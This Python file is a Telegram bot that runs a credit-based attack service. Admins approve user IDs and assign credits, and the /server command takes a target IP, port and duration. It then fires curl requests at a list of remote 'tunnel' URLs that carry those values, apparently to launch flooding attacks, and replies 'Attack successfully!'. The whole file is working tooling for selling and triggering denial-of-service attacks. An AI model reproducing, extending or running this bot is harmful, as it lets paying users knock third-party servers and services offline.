import os
import asyncio
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from telegram import Update
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, ContextTypes

TELEGRAM_TOKEN = ''


ADMIN_IDS = {760}
DATA_FILE = 'user_sessions.json'
CREDIT_COST_PER_ATTACK = 25

user_sessions = {}
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'r') as f:
        try:
            user_sessions = json.load(f)
            for session in user_sessions.values():
                if 'approved' in session and isinstance(session['approved'], list):
                    session['approved'] = set(session['approved'])
        except Exception:
            user_sessions = {}

VBV_LOADING_FRAMES = [
    "🟦 [■□□□□]",
    "🟦 [■■□□□]",
    "🟦 [■■■□□]",
    "🟦 [■■■■□]",
    "🟦 [■■■■■]",
]
def save_data():
    to_save = {}
    for k, v in user_sessions.items():
        copy_sess = v.copy()
        if 'approved' in copy_sess and isinstance(copy_sess['approved'], set):
            copy_sess['approved'] = list(copy_sess['approved'])
        to_save[k] = copy_sess
    with open(DATA_FILE, 'w') as f:
        json.dump(to_save, f)

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/start - Show commands\n"
        "/approve <id> <credit> - Approve ID with credit (admin only)\n"
        "/credit <id> <credit> - Add credit to ID (admin only)\n"
        "/remove <id> - Remove ID approval (admin only)\n"
        "/server <ip> <port> <time> - Run attack URLs with params on approved IDs\n"
        "/status - Show approved IDs and their credits\n"
    )

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    session.setdefault('credits', {})
    session.setdefault('approved', set())
    session['credits'][id_] = credit
    session['approved'].add(id_)
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Approved ID {id_} with {credit} credits.")

async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /credit <id> <credit>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    try:
        credit = int(context.args[1])
        if credit <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Credit must be a positive integer")
        return
    session = user_sessions.get(chat_id, {})
    if id_ not in session.get('credits', {}):
        await update.message.reply_text(f"ID {id_} is not yet approved.")
        return
    session['credits'][id_] += credit
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Added {credit} credits to ID {id_}. Total: {session['credits'][id_]}")

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <id>")
        return
    chat_id = str(update.effective_chat.id)
    id_ = context.args[0]
    session = user_sessions.get(chat_id, {})
    if 'approved' in session and id_ in session['approved']:
        session['approved'].remove(id_)
    if 'credits' in session and id_ in session['credits']:
        del session['credits'][id_]
    user_sessions[chat_id] = session
    save_data()
    await update.message.reply_text(f"Removed approval and credit for ID {id_}.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved:
        await update.message.reply_text("No approved IDs.")
        return
    lines = ["Approved IDs and credits:"]
    for id_ in approved:
        c = credits.get(id_, 0)
        lines.append(f"ID: {id_} — Credits: {c}")
    await update.message.reply_text("\n".join(lines))

async def run_url_with_subprocess(url: str):
    proc = await asyncio.create_subprocess_exec(
        'curl', '-s', url,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL
    )
    await proc.communicate()

async def server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    session = user_sessions.get(chat_id, {})
    approved_ids = session.get('approved', set())
    credits = session.get('credits', {})
    if not approved_ids:
        await update.message.reply_text("No approved IDs to run attack on. Use /approve first.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /server <ip> <port> <time>")
        return
    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
        if time_int <= 0:
            raise ValueError()
    except Exception:
        await update.message.reply_text("Time must be a positive integer")
        return
   
    try:
        with open("tunnel_url.txt", "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception:
        await update.message.reply_text("Failed to load tunnel_url.txt")
        return
    
    updated_urls = []
    for url in urls:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query['ip'] = [ip]
        query['port'] = [port]
        query['duration'] = [str(time_int)]
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment
        ))
        updated_urls.append(new_url)
    tasks = []
    for id_ in list(approved_ids):
        credit = credits.get(id_, 0)
        if credit < CREDIT_COST_PER_ATTACK:
            await update.message.reply_text(f"ID {id_} does not have enough credit. Needs at least {CREDIT_COST_PER_ATTACK}.")
            continue
        credits[id_] = credit - CREDIT_COST_PER_ATTACK
        
        for url in updated_urls:
            tasks.append(run_url_with_subprocess(url))
    if not tasks:
        await update.message.reply_text("No IDs with enough credit to start attack.")
        return
    user_sessions[chat_id]['credits'] = credits
    save_data()
    await context.bot.send_chat_action(chat_id=int(chat_id), action=ChatAction.TYPING)
    msg = await update.message.reply_text(VBV_LOADING_FRAMES[0] + " 0% completed")
    frame_count = len(VBV_LOADING_FRAMES)
    for i, frame in enumerate(VBV_LOADING_FRAMES):
        percentage = int(((i + 1) / frame_count) * 100)
        display_message = f"{frame}  {percentage}% completed"
        await asyncio.sleep(1)
        try:
            await msg.edit_text(display_message)
        except Exception:
            pass
    await asyncio.gather(*tasks)
    try:
        await msg.edit_text("✅ Attack successfully! Power By @soulcrack_owner")
    except Exception:
        pass

def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("credit", add_credit))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("server", server))
    app.add_handler(CommandHandler("status", status))
    app.run_polling()

if __name__ == "__main__":
    main()
    